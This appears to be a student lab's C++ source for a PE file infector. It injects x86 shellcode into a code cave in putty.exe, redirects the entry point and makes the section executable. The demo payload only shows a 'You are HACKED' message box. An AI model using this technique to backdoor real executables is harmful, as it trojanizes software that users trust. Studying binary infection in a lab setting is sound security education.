// lab3.cpp: определяет точку входа для консольного приложения.
//
#define UNICODE
#define _UNICODE

#include "stdafx.h"
#include "windows.h"
#include <iostream>
#include <string>
#include <cstdio>

#define db(x) __asm _emit x

__declspec(naked) int ShellcodeStart(VOID) {
	__asm {
			pushad
			call    routine
			popad
			jmp 0xBBBBBBBB

		routine :
			pop     ebp
			sub     ebp, offset routine
			push    0                                // MB_OK
			lea     eax, [ebp + szCaption]
			push    eax                              // lpCaption
			lea     eax, [ebp + szText]
			push    eax                              // lpText
			push    0                                // hWnd
			mov     eax, 0xAAAAAAAA
			call    eax  
			ret

			szCaption :
			db('H') db('i') db(' ') db('l') db('a') db('b') db('3') db(' ')
			db('I') db(' ') db('a') db('m') db(' ') db('J') db('J') db('P') db(0)
			szText :
			db('Y') db('o') db('u') db(' ') db('a') db('r') db('e') db(' ') 
			db('H') db('A') db('C') db('K') db('E') db('D') db(0)
	}
}

VOID ShellcodeEnd() {

}

PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
	return (PIMAGE_DOS_HEADER)file;
}

/*
* returns the PE header
*/
PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
	PIMAGE_DOS_HEADER pidh = GetDosHeader(file);

	return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);
}

/*
* returns the file header
*/
PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_FILE_HEADER)&pinh->FileHeader;
}

/*
* returns the optional header
*/
PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_OPTIONAL_HEADER)&pinh->OptionalHeader;
}

/*
* returns the first section's header
* AKA .text or the code section
*/
PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
}

PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
	return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)->FileHeader.NumberOfSections - 1));
}

BOOL VerifyDOS(PIMAGE_DOS_HEADER pidh) {
	return pidh->e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE;
}

BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
	return pinh->Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE;
}

std::wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

int main(int argc, char *argv[]) {

	TCHAR stdPath[60] = TEXT("C:\\Users\\Lavrov\\Desktop\\lab3\\putty.exe");

	HANDLE hFile = CreateFile(stdPath, FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD dwFileSize = GetFileSize(hFile, NULL);

	HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);

	LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);


	// check if valid pe file
	if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
		VerifyPE(GetPeHeader(lpFile)) == FALSE) {
		fprintf(stderr, "Not a valid PE file\n");
		return 1;
	}

	PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
	PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

	// get original entry point
	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
		pinh->OptionalHeader.ImageBase;

	//DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
	DWORD dwShellcodeSize = 74;

	// find code cave
	DWORD dwCount = 0;
	DWORD dwPosition = 0;

	for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
		if (*(lpFile + dwPosition) == 0x00) {
			if (dwCount++ == dwShellcodeSize) {
				// backtrack to the beginning of the code cave
				dwPosition -= dwShellcodeSize;
				break;
			}
		}
		else {
			// reset counter if failed to find large enough cave
			dwCount = 0;
		}
	}

	// if failed to find suitable code cave
	if (dwCount == 0 || dwPosition == 0) {
		return 1;
	}

	std::wstring stemp = s2ws("user32.dll");
	LPCWSTR wstr = stemp.c_str();

	// dynamically obtain address of function
	HMODULE hModule = LoadLibrary(wstr);

	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

	// create buffer for shellcode
	HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);
	
	LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);

	//// move shellcode to buffer to modify
	//memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);

	unsigned char Shellcode[] = \
		"\x60\xE8\x06\x00\x00\x00\x61\xE9\xBB\xBB\xBB\xBB\x5D\x55\x81\xED\xE6\x3B\x41\x00\x6A\x00\x8D"
		"\x85\x0E\x3C\x41\x00\x50\x8D\x85\x1b\x3C\x41\x00\x50\x6A\x00\xB8"
		"\xAA\xAA\xAA\xAA\xFF\xD0\xC3"
		//"\x49\x20\x61\x6d\x20\x44\x65\x6e\x69\x73\x6b\x61\x00"
		//"\x59\x61\x20\x76\x61\x73\x20\x77\x7a\x6c\x6f\x6d\x61\x6c\x00";
		"\x20\x48\x69\x20\x49\x20\x61\x6d\x20\x4a\x4a\x50\x00"
		"\x59\x6f\x75\x20\x61\x72\x65\x20\x48\x41\x43\x4b\x45\x44\x00";

	memcpy(lpHeap, Shellcode, dwShellcodeSize);

	// modify function address offset
	DWORD dwIncrementor = 0;
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		unsigned char kek = *((char *)lpHeap + dwIncrementor);
		printf("%d", kek);
		if (kek == 0xAA) {
			// insert function's address
			*(LPDWORD)((char *)lpHeap + dwIncrementor) = (DWORD)lpAddress;
			FreeLibrary(hModule);
			break;
		}
	}

	dwIncrementor = 0;
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		unsigned char kek = *((char *)lpHeap + dwIncrementor);
		printf("%d", kek);
		if (kek == 0xBB) {
			// insert OEP
			*(LPDWORD)((char *)lpHeap + dwIncrementor) = dwOEP - (DWORD)(dwPosition + (pish->VirtualAddress - pish->PointerToRawData) + pinh->OptionalHeader.ImageBase) - 12;
			break;
		}
	}

	// copy the shellcode into code cave
	memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
	/*HeapFree(hHeap, 0, lpHeap);
	HeapDestroy(hHeap);*/

	// update PE file information
	pish->Misc.VirtualSize += dwShellcodeSize;
	// make section executable
	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	// set entry point
	// RVA = file offset + virtual offset - raw offset
	pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;

	return 0;
}



